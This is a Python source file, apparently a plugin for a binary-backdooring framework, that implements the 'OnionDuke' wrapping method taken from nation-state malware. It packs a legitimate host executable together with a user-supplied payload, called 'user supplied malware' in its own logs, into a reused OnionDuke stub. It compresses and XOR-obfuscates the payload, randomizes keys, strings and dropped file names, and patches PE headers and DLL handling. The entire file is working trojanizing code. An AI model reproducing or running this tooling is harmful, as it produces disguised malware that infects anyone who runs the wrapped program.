import os
import logging
import subprocess
from od import od
from od.od import write_rsrc
from od.od import xor_file
from pe import pe_parse
import random
import string
import struct
import logging
import io


logger = logging.getLogger(__name__)

try:
    from cStringIO import StringIO
except:
    from io import BytesIO as StringIO


class onionduke:

    def __init__(self):
        self.name = """onionduke"""
        self.description = """The onionduke binary wrapping method: 
                              https://www.blackhat.com/docs/us-15/materials/us-15-Pitts-Repurposing-OnionDuke-A-Single-Case-Study-Around-Reusing-Nation-State-Malware-wp.pdf"""
        self.requirements = {'FILE': 'File to be wrapped used as the SUPPLIED_BINARY host',
                             'SUPPLIED_BINARY': 'Binary to be packed in onionduke method'
                            }
        self.supported_modes = None
        self.supported_payloads = None

    def check_reqs(self):
        check = True
        
        for key, value in self.requirements.items():
            if key not in self.BDF.options.keys():
                logger.error("Missing %s=%s", key, value)
                check = False
            else:
                setattr(self, key, self.BDF.options[key])
                
        if check is False:  
            return False

    def patch(self, BDF):
        self.BDF = BDF
        self.peitems = self.BDF.pe_object
        if self.check_reqs() is False:
            return False
        
        if not any(chiptype not in "armv" for chiptype in str(subprocess.check_output(["uname", "-a"])).lower()):
            logger.error("Only x86 and x86_64 chipset is supported for OnionDuke due to aPLib support")
            return False
        if 'rsrcSectionName' not in self.peitems:
            logger.error("Missing rsrc section, not patching bianry")
            return False

        od_stub = StringIO()

        stubPath = os.path.dirname(os.path.abspath(od.__file__))

        self.binary = StringIO()
        self.binary.write(self.BDF.pe_object['loaded_binary'].read(-1))
        self.binary.seek(0)
        self.binary.seek(0x5C0, 0)
        if self.binary.read(11) == "\x57\xE8\xE4\x10\x00\x00\x8B\x15\x2C\x20\x41":
            logger.warn("Attempting to Patch an OnionDuke wrapped binary")
            logger.info("Compressing %s with aPLib" % self.SUPPLIED_BINARY)
            
            if self.BDF.TESTING:
                compressedbin = 'H2DZ4JQJC0GM'
            else:
                compressedbin = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(12))
            subprocess.check_output(['appack', "c", self.SUPPLIED_BINARY, compressedbin])
            # key 0x1FE37D3E
            self.binary.seek(0x413, 0)
            xor_key1 = struct.unpack("<I", self.binary.read(4))[0]

            self.binary.seek(0x429, 0)
            xor_key2 = struct.unpack("<I", self.binary.read(4))[0]
            if xor_key2 == xor_key1:
                xorkey = xor_key1
                logger.info("Xor'ing {0} with key: {1}".format(self.SUPPLIED_BINARY, hex(xorkey)))
                with open(compressedbin, 'rb') as compressedBinary:
                    xorBinary = StringIO()
                    xor_file(compressedBinary, xorBinary, xorkey)
                os.remove(compressedbin)
            else:
                logger.error("Malformed OnionDuke Sample")
                return False

            xorBinary.seek(0)
            #get size and location of OD malware
            self.binary.seek(0xfd3c, 0)
            self.od_begin_malware = struct.unpack("<I", self.binary.read(4))[0]
            self.binary.seek(0)
            logger.info("Removing original malware from binary.")
            new_stub = self.binary.read(self.od_begin_malware)
            new_stub += xorBinary.read()
            od_stub.write(new_stub)
            self.od_end_malware = od_stub.tell()
            self.od_size_malware = xorBinary.tell()
            logger.info("Appending compressed user supplied binary after target binary")
            od_stub.seek(0xfd40, 0)
            od_stub.write(struct.pack("<I", self.od_size_malware))

        else:
            od_stub.write(open(stubPath + "/OD_stub.exe", 'rb').read())
            #copy rsrc to memory
            self.binary.seek(self.peitems['rsrcPointerToRawData'], 0)
            self.rsrc_section = StringIO()
            logger.info("Copying rsrc section")
            self.rsrc_section.write(self.binary.read(self.peitems['rsrcSizeRawData']))
            self.rsrc_section.seek(0)
            logger.info("Updating %s rsrc section" % self.FILE)
            write_rsrc(self.rsrc_section, self.peitems['rsrcVirtualAddress'], 0x16000)
            self.rsrc_section.seek(0)
            self.od_rsrc_begin = od_stub.tell()
            logger.info("Adding %s rsrc to OnionDuke stub" % self.FILE)
            od_stub.write(self.rsrc_section.read())
            self.od_binary_begin = od_stub.tell()

            #compress
            logger.info("Compressing %s with aPLib" % self.FILE)
            #USE Tempfile
            if self.BDF.TESTING:
                compressedbin = 'H2DZ4JQJC0GM'
            else:
                compressedbin = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(12))
            
            subprocess.check_output(['appack', "c", self.FILE, compressedbin])

            if self.BDF.TESTING:
                xorkey = 0xd56e591e
            else:
                xorkey = random.randint(0, 4294967295)
            logger.info("Xor'ing {0} with key: {1}".format(self.FILE, hex(xorkey)))
            with open(compressedbin, 'rb') as compressedBinary:
                xorBinary = StringIO()
                xor_file(compressedBinary, xorBinary, xorkey)
            xorBinary.seek(0)
            logger.info("Appending compressed binary after rsrc section")
            od_stub.write(xorBinary.read())
            self.od_begin_malware = od_stub.tell()
            os.remove(compressedbin)

            logger.info("Compressing %s with aPLib" % self.SUPPLIED_BINARY)
            if self.BDF.TESTING:
                compressedbin = 'P2DZ4JQJCOGN'
            else:
                compressedbin = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(12))
            
            subprocess.check_output(['appack', "c", self.SUPPLIED_BINARY, compressedbin])

            logger.info("Xor'ing {0} with key: {1}".format(self.SUPPLIED_BINARY, hex(xorkey)))
            with open(compressedbin, 'rb') as compressedBinary:
                xorBinary = StringIO()
                xor_file(compressedBinary, xorBinary, xorkey)
            xorBinary.seek(0)
            logger.info("Appending compressed user supplied binary after target binary")
            od_stub.write(xorBinary.read())
            self.od_end_malware = od_stub.tell()
            os.remove(compressedbin)

            # update size of image remember to round up the next Section Alignment
            od_stub.seek(0x138, 0)

            if ((0x16000 + self.peitems['rsrcVirtualSize']) % self.peitems['SectionAlignment']) != 0:
                size = ((0x16000 + self.peitems['rsrcVirtualSize']) -
                        ((0x16000 + self.peitems['rsrcVirtualSize']) % self.peitems['SectionAlignment'])
                        + self.peitems['SectionAlignment']
                        )
            else:
                size = 0x16000 + self.peitems['rsrcVirtualSize']

            # UPDATE STUB
            od_stub.write(struct.pack("<I", size))
            # update Resource Table in optional header SIZE
            od_stub.seek(0x174, 0)
            od_stub.write(struct.pack("<I", self.peitems['rsrcSizeRawData']))

            # update .rsrc
            od_stub.seek(0x288, 0)
            od_stub.write(struct.pack("<I", self.peitems['rsrcVirtualSize']))
            od_stub.seek(0x290, 0)
            od_stub.write(struct.pack("<I", self.peitems['rsrcSizeRawData']))

            #random string in .rdata
            if self.BDF.TESTING:
                od_stub.seek(0xD250, 0)
                od_stub.write(b'TESTING')
                od_stub.seek(0x107F0, 0)
                od_stub.write(b'TESTING')
            else:
                od_stub.seek(0xD250, 0)
                od_stub.write(bytearray(''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits)
                              for _ in range(random.randint(6, 12))), 'utf8'))

                #random string in .reloc
                od_stub.seek(0x107F0, 0)
                od_stub.write(bytearray(''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits)
                              for _ in range(random.randint(6, 12))), 'utf8'))
            # update data section
            od_stub.seek(0xfc28, 0)
            od_stub.write(struct.pack("<I", self.od_binary_begin))
            od_stub.write(struct.pack("<I", self.od_begin_malware - self.od_binary_begin))

        # update xor key in all places (two)
        od_stub.seek(0x413, 0)
        od_stub.write(struct.pack("<I", xorkey))
        od_stub.seek(0x429, 0)
        od_stub.write(struct.pack("<I", xorkey))

        od_stub.seek(0xfd3c, 0)
        od_stub.write(struct.pack("<I", self.od_begin_malware))
        od_stub.write(struct.pack("<I", self.od_end_malware - self.od_begin_malware))

        #update dropped file names
        if self.BDF.TESTING:
            od_stub.seek(0xfb20, 0)
            od_stub.write(b'TESTING1')

            od_stub.seek(0xfc34, 0)
            _temp_name = b'TEST2'
        
        else:
            od_stub.seek(0xfb20, 0)
            od_stub.write(bytearray(''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits)
                          for _ in range(random.randint(6, 12))), 'utf-8'))

            od_stub.seek(0xfc34, 0)
            _temp_name = bytearray(''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(random.randint(4, 8))), 'utf-8')
        
        _temp_name += b".exe"
        od_stub.write(_temp_name)

            
        #check submitted file to see if it is a DLL:
        with open(self.SUPPLIED_BINARY, 'rb') as self.binary:
            logger.info("Checking if user supplied is a DLL")
            
            self.parser = pe_parse.pe_parse(FILE=io.BytesIO(self.binary.read()), 
                                      DISK_OFFSET=self.BDF.options['DISK_OFFSET']
                                      )
        
            if self.parser.run():
                self.pe_object = self.parser.__dict__
            else:
                logger.error("PE Parser Failure! Wake the DEV! OK don't, but issue a bug.")
                return False
        
            #self.BDF.pe_parse.gather_file_info_win()
            #Check if DLL
            if (self.pe_object['Characteristics'] % 0x4000) - 0x2000 > 0 and self.peitems['DllCharacteristics'] > 0:
            #if self.pe_object['IsDLL']:
                logger.info("User supplied malware is a DLL!")
                logger.info("Patching OnionDuke Stub for DLL usage")
                self.binary.seek(0)
                #patch for dll
                od_stub.seek(0xfd38, 0)
                od_stub.write(b"\x01\x00\x00\x00")

                #read within a export location for speed.
                for section in reversed(self.peitems['Sections']):
                    if self.pe_object['ExportDirectoryTableRVA'] >= section[2]:
                        #go to exact export directory location
                        self.binary.seek((self.peitems['ExportDirectoryTableRVA'] - section[2]) + section[4])
                        break

                #read the Image Export Directory for printMessage
                if b'printMessage' not in self.binary.read(self.peitems['ExportTableSize']):
                    #use ordinal #1
                    od_stub.seek(0xfd44, 0)
                    od_stub.write(b"\x01\x00\x00\x00")
            else:
                logger.info("User supplied malware is not a DLL")

        # write to file
        od_stub.seek(0)
        #open(self.BDF.options.OUTPUT, 'wb').write(od_stub.read())
        #with open(self.BDF.options.OUTPUT, 'r+b') as self.binary:
            #self.gather_file_info_win()
            #if self.RUNAS_ADMIN is True:
            #    if self.parse_rsrc() is True:
            #        patch_result = self.patch_runlevel()
            #        if patch_result is False:
            #            print "[!] Could not patch higher run level in manifest, requestedExecutionLevel did not exist"
            #    else:
            #        print '[!] No manifest in rsrc'

        return od_stub
